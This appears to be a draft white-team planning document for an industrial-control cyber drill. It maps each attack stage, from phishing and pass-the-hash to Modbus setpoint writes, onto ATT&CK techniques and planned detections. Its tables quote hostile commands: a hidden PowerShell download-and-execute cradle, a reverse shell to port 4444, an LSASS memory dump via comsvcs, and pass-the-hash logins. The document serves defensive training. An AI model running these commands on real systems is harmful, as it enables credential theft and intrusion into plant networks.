# OT Cyber Drill — Golden-Path TTP → Blue Detection Map  **(DRAFT)**

**White Team only.** Working draft, 2026-10-20. Maps the golden path (`scripts/drill_run*.py` +
`GOLDEN_PATH.md`) to ATT&CK (Enterprise + ICS) and to the **real detection stack** (Splunk, Trellix/
ePO, Sysmon+UF, mail, Zeek+Suricata, Scribbler→`netdev`, honeyfile/honey-cred).

> **Status of the path (read first):**
> - **GP-0 → GP-2 are built/proven.** Phish delivery proven; PtH into MaintServer proven (`Pwn3d!`);
>   seed (`svc_backup` resident on RAC) built; extraction pending a Trellix exclusion (BLOCKERS B1/B2).
> - **GP-2 moved off AD.** The loot is **no longer** the DC `password.txt` honeyfile. It is now the
>   **SINEC NMS** repository on `DMZH2_MaintServer` 192.168.30.11 — a better OT-relevant crown jewel
>   (device inventory, credentials, config backups, the INS/boundary path). **`GOLDEN_PATH.md` GP-2 is
>   now stale** and needs reconciling to the NMS route.
> - **GP-3, GP-4, (proposed) GP-5 are NOT built** — proposed below, incident-anchored, for operator
>   decision. GP-3/GP-4 run on the **isolated surrogate OT segment (DD13)**, never the real SC646/L2/
>   L1/SIS.

---

## 1. Real OT incidents anchoring the story

| Incident | Canonical facts | Fit to our lab | Anchors |
|---|---|---|---|
| **Stuxnet** (2010, Natanz) | Compromised Siemens S7 PLCs over S7comm; altered centrifuge speeds while **replaying recorded "normal" values** to operators | *Conceptual* anchor only — the "write a value + fake the view" move. **Protocol does NOT match:** we never touch S7comm; our attackable endpoint is a **Modbus surrogate** (see Scope reality) | **GP-5 Manipulation of View** (concept) |
| **Ukraine 2015** (BlackEnergy / Sandworm) | Spearphish w/ macro → credential/VPN theft → remote **HMI operation to open breakers**; KillDisk; firmware-brick; TDoS | Exactly our chain shape: phish→creds→remote OT access→impact | Whole-chain narrative spine |
| **Industroyer / Industroyer2 / Pipedream** (2016/2022) | **Protocol-aware** OT malware/toolkits — IEC-101/104, IEC-61850, OPC DA/UA, **Modbus**, CODESYS — native control commands | Justifies **Modbus-write** detection and "native protocol ≠ exploit" lesson | GP-4 detection rationale |
| **Oldsmar** (2021, water) | Shared remote-access tool → chemical dosing **setpoint raised 100×**; **operator saw it, reverted**; no harm | Models our bounded CSTR/Modbus setpoint change + the **human-in-the-loop process-protection decision** | GP-4 + Blue batch-hold call |
| **TRITON/TRISIS** (2017, petrochemical) | Custom malware to **reprogram the Triconex SIS**; a fault tripped the plant to a safe state and exposed it | The anti-pattern justifying **rule 13**: SIS is sacrosanct, modeled on paper only | Alarm-suppression paper-SIM (T0878), SIS exclusion teaching |

## 2. Story spine

External actor phishes the enterprise remote-access user (**Ukraine-2015**), steals a resident
privileged hash, pivots to the **OT management plane — SINEC NMS** (crown jewel, holds the keys to the
OT estate). Using NMS's legitimate reach — **INS/RADIUS + boundary firewall** — the actor crosses into
the process LAN (**Industroyer/Pipedream** native-protocol reach), **writes a non-safety CSTR setpoint**
(**Oldsmar**) and tries to **mask it in the historian/HMI** (**Stuxnet** manipulation-of-view). The
**SIS is never touched** (**TRITON** lesson). Blue must catch each boundary crossing and make the
batch-hold/process-protection call before the SIS has to.

---

## 2a. Scope reality — what is actually attacked

The lab is a **Siemens showcase**, so the real Siemens S7/PROFINET cells (CPU 410, ES01/OSS01, SIS)
are **observe-only** — both because of rule 13 *and* because we don't demonstrate an attack on the
product we're promoting. The attacker therefore touches Siemens only at the **management plane**
(SINEC NMS / INS logins via **stolen valid accounts** — valid-account abuse, not a PLC exploit). The
**unauthorized-OT-write climax (GP-4/GP-5) lands on a vendor-neutral simulated Modbus device** on the
isolated drill segment. Protocol anchors are therefore **Modbus** (Industroyer/Pipedream Modbus
modules, Oldsmar setpoint abuse), **not S7comm**. Vendor-neutral Modbus is also the cleaner protocol
for teaching the read-vs-write distinction.

## 3. Stage-by-stage TTP → detection

### GP-0 — Phishing foothold  *(built)*

| Red action | ATT&CK (Ent) | ICS | Detection on our stack |
|---|---|---|---|
| Spoofed-internal lure, external envelope / internal `From`, `.hta` link (`phish_email.py`) | T1566.002 | T0865 | **`index=mail`** — SMTP from 10.5.20.50, envelope `@np-mail-security.com` vs header `admin@mail.np.local` (mismatch tell) + `.hta` link → build **`lab_mail` phish alert** |
| User clicks → HTA runs (`Mailbox_Security_Update.hta`) | T1204.001/.002 | — | Sysmon EC1 parent `mshta.exe` |
| `mshta.exe` runs VBScript | T1218.005 / T1059.005 | — | Sysmon EC1 `mshta` + HTTP arg; ESCU suspicious-mshta |
| `powershell -w hidden -nop -ep bypass IEX(DownloadString …/s.ps1)` | T1059.001 / T1105 / T1562.001 | — | **Sysmon EC1 `mshta→powershell` chain** (strongest host tell); 4104 script-block; Trellix/AMSI flags `revshell.ps1` (B1) |
| TCP reverse shell → Kali :4444 (`revshell.ps1`) | T1571 / T1095 | — | **Zeek `conn.log`** long-lived raw TCP to :4444; **Suricata** C2 sig |
| `whoami`, `whoami /groups` recon | T1033 / T1069.002 | — | 4104 / Sysmon EC1 cmdline; ESCU discovery |
| Thank-you decoy (`thankyou_email.py`) | (social cover) | — | second `index=mail` msg — AAR correlation artefact |

### GP-1 — Credential access & pass-the-hash  *(built/proven; extraction pending B1/B2)*

| Red action | ATT&CK (Ent) | ICS | Detection |
|---|---|---|---|
| `rundll32 comsvcs MiniDump <lsass>` (`extract_and_pth.py`) | T1003.001 / T1218.011 | — | **Sysmon EC10** LSASS access; EC1 rundll32/comsvcs; EC11 `lb*.dmp` FileCreate; **Trellix ENS quarantine → ePO threat event** (B2); ESCU cred-dump |
| dump → base64 → pull over WinRM | T1005 / T1132.001 / T1021.006 | — | EC1 base64 of `.dmp`; WinRM 5985 (4624 type3, `wsmprovhost`); Zeek http/conn RAC→Kali |
| pypykatz offline (on Kali) | T1003.001 | — | **not host-visible** — teaching point: detect at dump-**creation**, not after exfil |
| `nxc smb/winrm <NMS> -u svc_backup -H <hash>` | **T1550.002** / T1021.002/.006 | T0859 | **4624 type3 NTLM, no preceding 4768/4769** = PtH signature (Splunk `wineventlog`); **Zeek `ntlm.log`**; ESCU PtH/Overpass. Highest-value catch |

### GP-2 — Loot the OT management plane (**SINEC NMS**, revised)  *(destination proven; loot build TODO)*

| Red action | ATT&CK (Ent) | ICS | Detection |
|---|---|---|---|
| PtH land on MaintServer/NMS 192.168.30.11 | T1078 / T1021.002/.006 | T0859 | MaintServer **4624** (UF+Sysmon present) from unusual source; Zeek smb/winrm to .11 |
| Read NMS repository — device inventory, credentials, config backups, INS/boundary path | **T1555 / T1552.001 / T1005** | **T0811** Data from Information Repositories | **NMS application audit** (login + export/view of device creds); Sysmon EC1 interactive tools on NMS; **plant a honey-credential/decoy device in NMS** whose use is a canary (replaces the DC honeyfile SACL) |

> **Build note (GP-2):** replace the DC `password.txt`/4663 SACL canary with an **NMS honey-credential**
> — a decoy device entry (or an INS login that only works as a tripwire) whose first use fires a LAB /
> LAB NET alert. This keeps the clean, near-zero-FP canary signal but on the OT-relevant repository.

### GP-3 — INS → RADIUS user → boundary → open DMZ→OT  *(PROPOSED — surrogate segment, DD13)*

| Red action | ATT&CK (Ent) | ICS | Detection |
|---|---|---|---|
| Log into SINEC INS web UI w/ looted cred | T1078 / T1133 | T0859 | INS admin audit / web session; Zeek ssl/http to 10.1.20.21 |
| Create RADIUS/AAA user on INS | **T1136 / T1098** | — | INS audit → Scribbler → `netdev`: **LAB NET "AAA user created on INS"** |
| RADIUS-auth to boundary; add DMZ→OT rule | **T1562.004 / T1599** / T1078 | T0859 | Boundary **config-change syslog → `netdev`** (LAB NET "config change"); RADIUS auth event |

### GP-4 — EWS → Modbus write → light  *(PROPOSED — surrogate segment)*

| Red action | ATT&CK (Ent) | ICS | Detection |
|---|---|---|---|
| Log into EWS surrogate | T1078 | T0822 / T0859 | EWS surrogate 4624 + process audit |
| Modbus write (FC5/6/15/16) to coil | — | **T0855 / T0836 / T0831** | **Zeek `modbus.log`** / **Suricata ET Modbus-write**: a write on a read-only-polling segment is unmistakable; the light = physical ground truth |

### GP-5 — Manipulation of View (**NEW, PROPOSED**)  *(Stuxnet anchor)*

| Red action | ATT&CK (Ent) | ICS | Detection |
|---|---|---|---|
| Write setpoint **and** spoof historian/HMI trend to read normal | — | **T0832 Manipulation of View / T0856 Spoof Reporting Message** | The **independent operator record** cross-check vs the historian trend (Blue's core lesson — trust the out-of-band source); host/OT-write audit still shows the real write |

### SIS track — alarm suppression  *(PAPER-SIM ONLY — TRITON anchor, never live)*

| Technique | ICS | Treatment |
|---|---|---|
| Alarm/response inhibition | **T0878** | White delivers a SIM packet (missing-alarm sequence). Blue's job: notice the expected alarm is absent → **seek independent verification**. The SIS (CPU 410F, 192.168.2.x) is **never touched** (rule 13). This is where the safety exclusion becomes a teaching objective. |

---

## 4. Detection coverage: have vs. build

**Likely have (confirm names against the 50 ESCU / 12 LAB / 12 LAB NET):** PtH, credential-dumping,
suspicious PowerShell/mshta, discovery, brute-force/lockout, new-service/scheduled-task, firewall-deny.

**Build for this path:**
1. `lab_mail` — envelope-vs-header mismatch + `.hta`/external link (GP-0).
2. **NMS honey-credential** canary + NMS audit alert (GP-2, replaces DC 4663).
3. LAB NET "AAA user created on INS" + "boundary config change" (GP-3).
4. Modbus-write Zeek/Suricata alert on the drill OT segment (GP-4).
5. Historian/operator-record discrepancy cross-check (GP-5).
6. `mshta→powershell→outbound-TCP` chained correlation (GP-0).

**Open decisions / gaps:**
- **Trellix exclusion neuters the best cred-dump alert.** Scope the RAC exclusion to *allow execution
  but keep ENS detect/report* (observe-mode) so ePO still logs without quarantining — else document it
  as a deliberate "EDR-blind" branch (Branch C) so Blue isn't scored on an impossible catch.
- **Deny-only firewall logging (DG3):** GP-3's rule-add / allow legs won't hit `netdev` without drill
  allow-logging.
- **GP-2 NMS audit depth:** confirm SINEC NMS logs credential-view/export, not just login.
- **GP-3+ built on the isolated surrogate segment (DD13)** — real SC646/L2/L1/SIS untouched.

---

## 5. Next-step decisions for the operator

1. Confirm the **GP-2 NMS honey-credential** design (and retire the DC-honeyfile route in `GOLDEN_PATH.md`).
2. Approve **GP-5 Manipulation-of-View** as a stage (Stuxnet) and the **SIS alarm-suppression paper-SIM** (TRITON).
3. Confirm the **surrogate OT segment** build scope for GP-3/GP-4 (boundary + EWS + Modbus light), RADIUS-backed by real INS.
4. Trellix observe-mode vs EDR-blind branch; firewall drill allow-logging yes/no.
